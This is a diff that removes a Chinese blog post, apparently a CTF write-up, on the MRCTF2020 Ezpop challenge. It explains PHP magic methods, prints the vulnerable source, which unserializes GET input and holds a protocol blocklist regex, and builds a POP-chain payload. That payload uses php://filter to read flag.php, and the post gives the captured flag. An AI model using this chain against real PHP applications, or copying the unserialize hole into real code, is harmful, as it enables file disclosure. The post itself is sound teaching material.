@@ -1,555 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='复现地址：BUUOJ
-打开题目即送源码：MRCTF_ezpop
-先说PHP的一些魔术方法：
-__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问（或不存在）的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发有了这些知识后，我们再来分析源码；
-Welcome to index.php&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {protected $var;public function append($value){include($value);}public function __invoke(){$this-&amp;gt;append($this-&amp;gt;var);}}class Show{public $source;public $str;public function __construct($file=&#39;index.php&#39;){$this-&amp;gt;source = $file;echo &#39;Welcome to &#39;.'><title>由MRCTF2020学习反序列化POP链</title>
-
-<link rel='canonical' href='https://anthem-whisper.github.io/tmp/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='由MRCTF2020学习反序列化POP链'>
-<meta property='og:description' content='复现地址：BUUOJ
-打开题目即送源码：MRCTF_ezpop
-先说PHP的一些魔术方法：
-__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问（或不存在）的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发有了这些知识后，我们再来分析源码；
-Welcome to index.php&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {protected $var;public function append($value){include($value);}public function __invoke(){$this-&amp;gt;append($this-&amp;gt;var);}}class Show{public $source;public $str;public function __construct($file=&#39;index.php&#39;){$this-&amp;gt;source = $file;echo &#39;Welcome to &#39;.'>
-<meta property='og:url' content='https://anthem-whisper.github.io/tmp/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Tmp' />
-<meta name="twitter:title" content="由MRCTF2020学习反序列化POP链">
-<meta name="twitter:description" content="复现地址：BUUOJ
-打开题目即送源码：MRCTF_ezpop
-先说PHP的一些魔术方法：
-__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问（或不存在）的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发有了这些知识后，我们再来分析源码；
-Welcome to index.php&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {protected $var;public function append($value){include($value);}public function __invoke(){$this-&amp;gt;append($this-&amp;gt;var);}}class Show{public $source;public $str;public function __construct($file=&#39;index.php&#39;){$this-&amp;gt;source = $file;echo &#39;Welcome to &#39;.">
-    </head>
-    <body class="article-page keep-sidebar">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended ">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全和代码审计</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>暗色模式</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/tmp/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/">由MRCTF2020学习反序列化POP链</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p>复现地址：<a class="link" href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop"  target="_blank" rel="noopener"
-    >BUUOJ</a></p>
-<p>打开题目即送源码：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/MRCTF2020/MRCTF_ezpop.zip"  target="_blank" rel="noopener"
-    >MRCTF_ezpop</a></p>
-<p>先说PHP的一些魔术方法：</p>
-<pre><code>__wakeup() //使用unserialize时触发
-__sleep() //使用serialize时触发
-__destruct() //对象被销毁时触发
-__call() //在对象上下文中调用不可访问的方法时触发
-__callStatic() //在静态上下文中调用不可访问的方法时触发
-__get() //用于从不可访问（或不存在）的属性读取数据
-__set() //用于将数据写入不可访问的属性
-__isset() //在不可访问的属性上调用isset()或empty()触发
-__unset() //在不可访问的属性上使用unset()时触发
-__toString() //把类当作字符串使用时触发
-__invoke() //当尝试将对象调用为函数时触发
-</code></pre><p>有了这些知识后，我们再来分析源码；</p>
-<pre><code>Welcome to index.php
-&lt;?php
-//flag is in flag.php
-//WTF IS THIS?
-//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5
-%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
-//And Crack It!
-class Modifier {
-    protected  $var;
-    public function append($value){
-        include($value);
-    }
-    public function __invoke(){
-        $this-&gt;append($this-&gt;var);
-    }
-}
-
-class Show{
-    public $source;
-    public $str;
-    public function __construct($file='index.php'){
-        $this-&gt;source = $file;
-        echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;;
-    }
-    public function __toString(){
-        return $this-&gt;str-&gt;source;
-    }
-
-    public function __wakeup(){
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
-            echo &quot;hacker&quot;;
-            $this-&gt;source = &quot;index.php&quot;;
-        }
-    }
-}
-
-class Test{
-    public $p;
-    public function __construct(){
-        $this-&gt;p = array();
-    }
-
-    public function __get($key){
-        $function = $this-&gt;p;
-        return $function();
-    }
-}
-
-if(isset($_GET['pop'])){
-    @unserialize($_GET['pop']);
-}
-else{
-    $a=new Show;
-    highlight_file(__FILE__);
-}
-</code></pre><p>我们可以看到，在<code>Modifier</code>类里面有一个include函数，可以通过这个包含flag.php</p>
-<pre><code>class Modifier {
-    protected  $var;
-    public function append($value){
-        include($value);
-    }
-    public function __invoke(){
-        $this-&gt;append($this-&gt;var);
-    }
-}
-</code></pre><p>当我们尝试将对象调用为函数时，<code>__invoke()</code>就会自动包含 <code>$var</code></p>
-<p>所以，我们又看到了<code>Test</code>类里面：</p>
-<pre><code>class Test{
-    public $p;
-    public function __construct(){
-        $this-&gt;p = array();
-    }
-
-    public function __get($key){
-        $function = $this-&gt;p;
-        return $function();
-    }
-}
-</code></pre><p>当我们访问<code>Test</code>类里面一个不可见或者不存在的属性时，<code>__get()</code>自动以函数的方式调用<code>$p</code>;</p>
-<p>那么，源码里面那里能够访问一个属性呢？</p>
-<p><code>Show</code>类：</p>
-<pre><code>class Show{
-    public $source;
-    public $str;
-    public function __construct($file='index.php'){
-        $this-&gt;source = $file;
-        echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;;
-    }
-    public function __toString(){
-        return $this-&gt;str-&gt;source;
-    }
-
-    public function __wakeup(){
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
-            echo &quot;hacker&quot;;
-            $this-&gt;source = &quot;index.php&quot;;
-        }
-    }
-}
-</code></pre><p>它可以访问自身属性<code>str</code>的成员<code>source</code></p>
-<p>如果我们把<code>str</code>属性new一个<code>Test</code>，但是Test里面并没有source属性，</p>
-<p>那么我们new的Test就会以函数的方式调用<code>$p</code>那么如果<code>$p</code>又是一个<code>Modifier</code>类，就会自动包含$var指向的页面。</p>
-<p>所以，我们构造的思路是：</p>
-<pre><code>$poc = new Show; 
-$poc-&gt;source = new Show; 
-$poc-&gt;source-&gt;str = new Test; 
-$poc-&gt;source-&gt;str-&gt;p = new Modifier;
-</code></pre><p>playload：</p>
-<pre><code>&lt;?php
-class Modifier {
-    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
-    public function append($value){
-        include($value);
-    }
-    public function __invoke(){
-        $this-&gt;append($this-&gt;var);
-    }
-}
-
-class Show{
-    public $source;
-    public $str;
-    public function __toString(){
-        return $this-&gt;str-&gt;source;
-    }
-
-    public function __wakeup(){
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
-            echo &quot;hacker&quot;;
-            $this-&gt;source = &quot;index.php&quot;;
-        }
-    }
-}
-
-class Test{
-    public $p;
-
-    public function __get($key){
-        $function = $this-&gt;p;
-        return $function();
-    }
-}
-
-$poc = new Show;
-$poc-&gt;source = new Show;
-$poc-&gt;source-&gt;str = new Test;
-$poc-&gt;source-&gt;str-&gt;p = new Modifier;
-echo serialize($poc);
-</code></pre><p>解释一下：</p>
-<pre><code>$poc-&gt;source = new Show;
-//为什么要new show两次？
-//触发__toString()，source被第一层show当作字符串，于是访问source-&gt;str-&gt;source,也就是Test里面的source(不存在)，触发__get
-$poc-&gt;source-&gt;str = new Test;
-//$poc-&gt;source-&gt;str-&gt;source（Test-&gt;source）不存在，触发__get
-</code></pre><p>运行脚本，得到：（注意：Modifier类的protect属性注入需要加%00）</p>
-<pre><code>O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:{s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}}}s:3:&quot;str&quot;;N;}
-</code></pre><p>GET传值即获flag.php</p>
-<p>MRCTF{1892c0f7-3c71-431f-a991-7414ca1ea339}</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-     
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2019 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
